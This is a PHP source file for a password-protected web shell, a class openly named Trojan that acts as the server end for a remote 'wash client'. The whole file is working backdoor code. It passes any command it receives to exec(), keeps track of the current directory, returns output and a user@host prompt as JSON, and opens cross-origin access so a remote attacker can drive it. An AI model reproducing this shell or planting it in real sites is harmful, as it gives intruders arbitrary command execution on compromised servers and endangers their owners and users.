<?php

class Trojan{
    private $cwd      = '';
    private $response = array(
        /*
        'error'          => null,
        'output'         => null,
        'prompt_context' => null,
        */
    );

    /**
     * A generic constructor
     */
    public function __construct(){
        # emulate cwd persistence
        $this->cwd = (isset($_SESSION['cwd'])) ? $_SESSION['cwd'] : trim(`pwd`);
    }

    /**
     * Processes commands sent from the wash client
     *
     * @param string $json             JSON from the wash client
     */
    public function process_command($json){
        # if the specified action was 'shell', pipe the command directly into
        # the web shell.
        if($json['action'] == 'shell'){
            $this->process_shell_command($json['cmd']);
        }

        # otherwise, simply invoke the method directly
        else {
            $this->response['error'] = "{$json['action']} unsupported.";
            $this->send_response();
        }
    }

    /**
     * Processes a command from the wash client
     *
     * @param string $command          A command - this will change
     * @bug: When redirecting output to a file, errors are not reported to the 
     * shell. This happens because stderr is being directed to stdout, which is 
     * in turn being redirected into a file. If the error that was to be 
     * reported was that the redirect file could not be created, however, 
     * output just goes to a black hole. @see Github issue #38.
     */
    private function process_shell_command($command){
        /* @note: In order to get current directory persistence to work, I need 
         * to inject some `cd` and `pwd` commands around the command sent from 
         * the wash client. */
        $output_raw = array();
        exec("cd {$this->cwd}; $command 2>&1; pwd", $output_raw);

        # buffer the results
        $_SESSION['cwd']          = $this->cwd = array_pop($output_raw);
        $this->response['output'] = join($output_raw, "\n");

        # send the response
        $this->send_response();
    }

    /**
     * Sends a response back to the wash client
     */
    private function send_response(){
        /* This header prevents the wash client from malfunctioning due to the 
         * Same-Origin Policy. @see: http://enable-cors.org/ */
        $this->response['prompt_context'] = $this->get_prompt_context();
        header('Access-Control-Allow-Origin: *');

        # assemble and send a JSON-encoded response
        echo json_encode($this->response);
        die();
    }

    /**
     * Assembles the prompt context to return to the wash client
     *
     * @return string $prompt_context  The prompt context
     */
    private function get_prompt_context(){
        $whoami               =  trim(`whoami`);
        $hostname             =  gethostname();
        $line_terminator      =  ($whoami ==  'root') ? '#' : '$' ;
        return "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
    }
}

/* ---------- Procedural code starts here ---------- */

# only process the command if a valid password has been specified
if(sha1($_REQUEST['args']['password'] . 'c5e5f704ee') == '003da5748a1cdeac275548be9741cb35b76f773d'){ 
    session_start();
    $trojan = new Trojan();
    $trojan->process_command($_REQUEST);
}

# otherwise, just spit back an error message
else { 
    header('Access-Control-Allow-Origin: *');
    die('{"error":"Invalid password."}');
}
